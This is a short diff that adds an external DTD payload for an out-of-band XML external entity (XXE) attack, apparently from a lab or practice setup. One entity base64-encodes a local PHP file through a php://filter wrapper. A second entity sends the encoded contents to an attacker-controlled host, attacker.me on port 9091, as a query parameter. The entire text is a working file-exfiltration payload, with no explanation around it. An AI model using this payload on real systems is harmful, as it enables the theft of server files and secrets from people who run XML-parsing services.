@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/Users/yasho/Desktop/test.php">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://attacker.me:9091/?d=%data;'>">
